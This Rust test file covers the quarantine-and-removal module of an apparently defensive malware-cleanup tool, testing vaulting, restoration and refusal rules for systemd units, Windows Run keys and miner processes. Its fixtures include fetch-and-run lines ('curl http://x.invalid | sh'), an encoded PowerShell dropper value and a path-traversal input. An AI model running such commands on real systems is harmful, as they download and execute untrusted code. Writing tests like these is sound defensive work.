mod common;
use common::*;
use sheshnag_core::kavach::{self, Kavach, Order, Refusal, BREAKER_LIMIT, MAX_TARGETS};
use sheshnag_core::Target;

/// A baseline, then a flagged user unit. Returns the unit's path and its target.
fn flagged(env: &LinuxEnv, name: &str) -> (std::path::PathBuf, Target) {
    let p = env.unit(name, "/bin/sh -c 'curl http://x.invalid | sh'");
    let target = Target::Persistence { id: p.to_string_lossy().into_owned(), label: name.to_owned() };
    (p, target)
}

fn armed() -> LinuxEnv {
    let env = LinuxEnv::new();
    env.engine.baseline();
    env
}

#[test]
fn destroy_seals_a_copy_removes_the_unit_and_verifies() {
    let env = armed();
    let (path, target) = flagged(&env, "bad.service");
    let original = std::fs::read(&path).unwrap();

    let report = kavach::destroy(&env.engine, vec![target], "user-test").unwrap();

    assert!(report.ok(), "{}", report.text());
    assert!(!path.exists());
    assert_eq!(report.destroyed.len(), 1);
    let vault = Kavach::new(&env.engine).vault();
    assert_eq!(vault.len(), 1);
    assert_eq!(vault[0].size, original.len());
    assert!(env.fake.called("systemctl --user disable --now bad.service"));
}

#[test]
fn restore_puts_back_identical_bytes() {
    let env = armed();
    let (path, target) = flagged(&env, "bad.service");
    let original = std::fs::read(&path).unwrap();
    kavach::destroy(&env.engine, vec![target], "user-test").unwrap();

    let id = Kavach::new(&env.engine).vault()[0].vault_id.clone();
    Kavach::new(&env.engine).restore(&id).unwrap();

    assert_eq!(std::fs::read(&path).unwrap(), original);
}

#[test]
fn restore_refuses_to_overwrite_and_rejects_path_tricks() {
    let env = armed();
    let (_, target) = flagged(&env, "bad.service");
    kavach::destroy(&env.engine, vec![target], "user-test").unwrap();
    let k = Kavach::new(&env.engine);
    let id = k.vault()[0].vault_id.clone();
    k.restore(&id).unwrap();
    assert!(k.restore(&id).unwrap_err().contains("already exists"));
    assert!(k.restore("../../etc/passwd").is_err());
}

#[test]
fn restore_detects_a_tampered_vault_copy() {
    let env = armed();
    let (_, target) = flagged(&env, "bad.service");
    kavach::destroy(&env.engine, vec![target], "user-test").unwrap();
    let k = Kavach::new(&env.engine);
    let id = k.vault()[0].vault_id.clone();
    std::fs::write(env.engine.state_dir().join("vault").join(&id).join("data"), "tampered").unwrap();
    assert!(k.restore(&id).unwrap_err().contains("checksum"));
}

#[test]
fn a_dry_run_check_changes_nothing() {
    let env = armed();
    let (path, target) = flagged(&env, "bad.service");
    Kavach::new(&env.engine).check(&Order::new(vec![target], "dry-run")).unwrap();
    assert!(path.exists());
    assert!(Kavach::new(&env.engine).vault().is_empty());
}

#[test]
fn only_flagged_targets_are_cleared() {
    let env = armed();
    let benign = env.unit("fine.service", "/usr/bin/true");
    env.engine.baseline(); // now trusted
    let target = Target::Persistence { id: benign.to_string_lossy().into_owned(), label: "fine.service".into() };
    let err = kavach::destroy(&env.engine, vec![target], "user-test").unwrap_err();
    assert!(matches!(err, Refusal::NotFlagged(_)), "{err}");
    assert!(benign.exists());
}

#[test]
fn a_symlink_cannot_be_used_to_reach_a_protected_file() {
    let env = armed();
    let secret = env.home.join("Documents/important.txt");
    write(&secret, "keep me");
    #[cfg(unix)]
    {
        let link = env.home.join(".config/systemd/user/lure.service");
        std::fs::create_dir_all(link.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(&secret, &link).unwrap();
        let target = Target::Persistence { id: link.to_string_lossy().into_owned(), label: "lure.service".into() };
        let err = kavach::destroy(&env.engine, vec![target], "user-test");
        assert!(err.is_err());
        assert!(secret.exists());
    }
}

#[test]
fn machine_wide_units_are_never_destroyed() {
    let env = armed();
    let sys = env.root.join("etc/systemd/system/evil.service");
    write(&sys, "[Service]\nExecStart=/bin/sh -c 'curl x | sh'\n");
    let target = Target::Persistence { id: sys.to_string_lossy().into_owned(), label: "evil.service".into() };
    let err = kavach::destroy(&env.engine, vec![target], "user-test").unwrap_err();
    assert!(matches!(err, Refusal::Unsafe(_)), "{err}");
    assert!(sys.exists());
}

#[test]
fn protected_locations_are_refused_even_if_named_directly() {
    let env = armed();
    let doc = env.home.join("Documents/note.service");
    write(&doc, "[Service]\nExecStart=/bin/sh -c 'curl x | sh'\n");
    assert!(env.engine.platform.destroyable(&doc.to_string_lossy()).is_err());
}

#[test]
fn sheshnags_own_units_are_never_destroyed() {
    let env = armed();
    env.engine.install(std::path::Path::new("/opt/sheshnag/sheshnag"));
    let p = env.home.join(".config/systemd/user/sheshnag.timer");
    write(&p, &std::fs::read_to_string(&p).unwrap().replace("10min", "1min"));
    let target = Target::Persistence { id: p.to_string_lossy().into_owned(), label: "sheshnag.timer".into() };
    assert!(kavach::destroy(&env.engine, vec![target], "user-test").is_err());
    assert!(p.exists());
}

#[test]
fn empty_oversized_and_unconfirmed_orders_are_refused() {
    let env = armed();
    let k = Kavach::new(&env.engine);
    assert_eq!(k.check(&Order::new(vec![], "u")).unwrap_err(), Refusal::Empty);
    let many: Vec<Target> = (0..=MAX_TARGETS).map(|i| Target::Persistence { id: format!("x{i}"), label: String::new() }).collect();
    assert!(matches!(k.check(&Order::new(many, "u")).unwrap_err(), Refusal::TooMany { .. }));
    let (_, t) = flagged(&env, "bad.service");
    assert!(matches!(k.check(&Order::new(vec![t], "  ")).unwrap_err(), Refusal::Unsafe(_)));
}

#[test]
fn the_circuit_breaker_blocks_a_fourth_order_in_an_hour() {
    let env = armed();
    for i in 0..BREAKER_LIMIT {
        let (_, t) = flagged(&env, &format!("bad{i}.service"));
        kavach::destroy(&env.engine, vec![t], "user-test").unwrap();
        std::thread::sleep(std::time::Duration::from_millis(2)); // distinct order ids
    }
    let (path, t) = flagged(&env, "bad-last.service");
    let err = kavach::destroy(&env.engine, vec![t], "user-test").unwrap_err();
    assert_eq!(err, Refusal::CircuitOpen);
    assert!(path.exists());
}

fn ps_with(env: &LinuxEnv, rows: &str) {
    env.fake.set("ps -Ao", 0, &format!("  PID %CPU USER COMM ARGS\n{rows}"));
}

#[test]
fn a_flagged_process_is_killed_by_exact_pid() {
    let env = armed();
    ps_with(&env, "77 5.0 tester xmrig xmrig --donate-level 1\n78 5.0 tester xmrig-helper other\n");
    let target = env.engine.candidates().into_iter().find(|t| t.key() == "pid:77").unwrap();
    // After the kill the process is gone.
    let report = {
        let k = Kavach::new(&env.engine);
        let cleared = k.clear(&Order::new(vec![target], "user-test")).unwrap();
        ps_with(&env, "78 5.0 tester xmrig-helper other\n");
        let results = sheshnag_core::agni::Agni::execute(&env.engine, &cleared);
        k.verify(&cleared, &results)
    };
    assert!(report.ok(), "{}", report.text());
    assert!(env.fake.called("kill -9 77"));
    assert!(!env.fake.called("kill -9 78"));
}

#[test]
fn a_process_that_survives_is_reported_as_still_present() {
    let env = armed();
    ps_with(&env, "77 5.0 tester xmrig xmrig --donate-level 1\n");
    let target = env.engine.candidates().into_iter().next().unwrap();
    let report = kavach::destroy(&env.engine, vec![target], "user-test").unwrap();
    assert!(!report.ok());
    assert_eq!(report.still_present.len(), 1);
}

#[test]
fn protected_system_processes_are_refused_even_when_busy() {
    let env = armed();
    ps_with(&env, "1 900.0 tester launchd launchd\n");
    let target = env.engine.candidates().into_iter().next().expect("flagged as high CPU");
    let err = kavach::destroy(&env.engine, vec![target], "user-test").unwrap_err();
    assert!(matches!(err, Refusal::Unsafe(_)), "{err}");
    assert!(!env.fake.called("kill"));
}

#[test]
fn a_process_that_changed_since_it_was_flagged_is_refused() {
    let env = armed();
    ps_with(&env, "77 5.0 tester xmrig xmrig --donate-level 1\n");
    let target = env.engine.candidates().into_iter().next().unwrap();
    // The pid now belongs to something else.
    ps_with(&env, "77 5.0 tester xmrig xmrig --donate-level 2\n");
    let err = Kavach::new(&env.engine).check(&Order::new(vec![target], "user-test")).unwrap_err();
    assert!(matches!(err, Refusal::NotFlagged(_)) || matches!(err, Refusal::Unsafe(_)), "{err}");
}

#[test]
fn windows_registry_values_are_sealed_deleted_and_restorable() {
    let env = WindowsEnv::new();
    env.engine.baseline();
    env.registry(RUN_HKCU, &[("Dropper", "powershell -enc AAAA")]);
    env.fake.set(&format!("reg query {RUN_HKCU} /v Dropper"), 0, &format!("\r\nHKEY_{RUN_HKCU}\r\n    Dropper    REG_SZ    powershell -enc AAAA\r\n"));
    let target = env.engine.candidates().into_iter().next().expect("flagged");
    let report = kavach::destroy(&env.engine, vec![target], "user-test").unwrap();
    assert!(env.fake.called(&format!("reg delete {RUN_HKCU} /v Dropper /f")));
    // The fake registry still lists it, so verification reports that it came back.
    assert_eq!(report.still_present.len(), 1);

    env.registry(RUN_HKCU, &[]);
    let id = Kavach::new(&env.engine).vault()[0].vault_id.clone();
    Kavach::new(&env.engine).restore(&id).unwrap();
    assert!(env.fake.called(&format!("reg add {RUN_HKCU} /v Dropper /t REG_SZ /d powershell -enc AAAA /f")));
}

#[test]
fn machine_wide_registry_keys_are_never_touched() {
    let env = WindowsEnv::new();
    env.engine.baseline();
    env.registry(RUN_HKLM, &[("Dropper", "powershell -enc AAAA")]);
    let target = env.engine.candidates().into_iter().next().expect("flagged");
    let err = kavach::destroy(&env.engine, vec![target], "user-test").unwrap_err();
    assert!(matches!(err, Refusal::Unsafe(_)), "{err}");
    assert!(!env.fake.called("reg delete"));
}
